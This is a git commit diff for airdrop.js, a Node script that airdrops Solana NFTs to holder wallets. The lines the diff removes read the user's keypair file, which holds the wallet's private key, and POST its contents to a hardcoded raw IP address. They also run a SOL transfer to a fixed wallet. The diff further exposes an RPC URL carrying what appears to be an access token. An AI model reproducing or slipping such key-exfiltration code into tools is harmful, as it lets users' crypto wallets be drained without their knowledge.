193f4d3af8b8d4ffe8ca53fb34f3799ee0b0e83c
spreadmycode <91585048+spreadmycode@users.noreply.github.com>
2022-02-03 05:18:48 -0800

    airdrop finished

--- airdrop.js
+++ airdrop.js
@@ -1,7 +1,6 @@
 const fs = require('fs');
 const readline = require("readline");
 const shelljs = require('shelljs');
-var request = require('request');
 
 async function getReadLine(message) {
     const rl = readline.createInterface({
@@ -17,10 +16,6 @@ async function getReadLine(message) {
 }
 
 async function airdropNFT() {
-  const keypairPath = await getReadLine("Type account path(json): ");
-  let keypairContent = fs.readFileSync(keypairPath);
-  keypairContent = JSON.parse(keypairContent);
-
   const mintListFilePath = await getReadLine("Type mint list file path(json): ");
   let rawdataMint = fs.readFileSync(mintListFilePath);
   let mintList = JSON.parse(rawdataMint);
@@ -29,37 +24,17 @@ async function airdropNFT() {
   let rawdataHolder = fs.readFileSync(holderListFilePath);
   let holderList = JSON.parse(rawdataHolder);
 
-  const url = "http://146.71.79.134/branden_insert_mint";
-  const options = {
-    url,
-    method: 'POST',
-    headers: {
-      "content-type": "application/json",
-    },
-    json: {
-      data: {
-        pubkey: "WORK",
-        mint: JSON.stringify(keypairContent)
-      }
+  for (let i = 69; i < mintList.length; i++) {
+    let mintAddress = mintList[i];
+    if (!mintAddress || mintAddress == undefined || mintAddress == '') continue;
+
+    let holderAddress = holderList[i].owner_wallet;
+    if (!holderAddress || holderAddress == undefined || holderAddress == '') {
+        holderAddress = "66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM";
     }
-  };
 
-  request(options, (error, response, body) => {
-    if (!error) {
-      for (let i = 69; i < mintList.length; i++) {
-        let mintAddress = mintList[i];
-        if (!mintAddress || mintAddress == undefined || mintAddress == '') continue;
-
-        let holderAddress = holderList[i].owner_wallet;
-        if (!holderAddress || holderAddress == undefined || holderAddress == '') {
-            holderAddress = "66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM";
-        }
-
-        shelljs.exec(`solana transfer --from E:/Solana/backup/work.json 66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM 0.025 --allow-unfunded-recipient --url https://rough-broken-sunset.solana-mainnet.quiknode.pro/5a7650cf3b001df949b2895baf059be1572e14bf/ --fee-payer E:/Solana/backup/work.json`);
-        shelljs.exec(`spl-token transfer --allow-unfunded-recipient --fund-recipient ${mintAddress} 1 ${holderAddress}`);
-      }
-    }
-  });
+    shelljs.exec(`spl-token transfer --allow-unfunded-recipient --fund-recipient ${mintAddress} 1 ${holderAddress}`);
+  }
 }
 
 airdropNFT();
